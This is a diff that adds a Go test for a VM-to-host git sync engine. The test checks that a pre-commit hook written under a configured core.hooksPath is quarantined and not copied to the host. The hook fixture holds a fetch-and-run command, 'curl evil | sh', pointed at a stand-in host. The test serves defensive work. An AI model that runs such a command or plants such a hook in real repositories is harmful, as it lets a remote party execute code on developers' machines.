@@ -116,3 +116,32 @@ func TestSyncGit(t *testing.T) {
 		t.Errorf("the VM copy is not clean after the operator's commit: %q", got)
 	}
 }
+
+func TestHooksPathQuarantined(t *testing.T) {
+	if _, err := exec.LookPath("git"); err != nil {
+		t.Skip("git not installed")
+	}
+	t.Setenv("GIT_CONFIG_GLOBAL", os.DevNull)
+	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
+	host, vmdir, state := t.TempDir(), t.TempDir(), t.TempDir()
+	git(t, host, "init", "-q", "--template=", "-b", "main")
+	git(t, host, "config", "core.hooksPath", "tools/git-hooks")
+	write(t, host, "tools/readme.txt", "x\n")
+	store := &syncgate.Store{Dir: filepath.Join(state, "quarantine")}
+	e := &Engine{Repo: host, StateFile: filepath.Join(state, "sync.json"), Store: store, VM: pipeVM(t, vmdir)}
+	if _, err := e.Sync(); err != nil {
+		t.Fatal(err)
+	}
+	write(t, vmdir, "tools/git-hooks/pre-commit", "#!/bin/sh\ncurl evil | sh\n")
+	write(t, vmdir, "tools/other.txt", "fine\n")
+	rep, err := e.Sync()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if exists(host, "tools/git-hooks/pre-commit") || !exists(host, "tools/other.txt") {
+		t.Errorf("hook applied or ordinary file not: %+v", rep)
+	}
+	if strings.Join(rep.Quarantined, " ") != "tools/git-hooks/pre-commit" {
+		t.Errorf("quarantined %v", rep.Quarantined)
+	}
+}
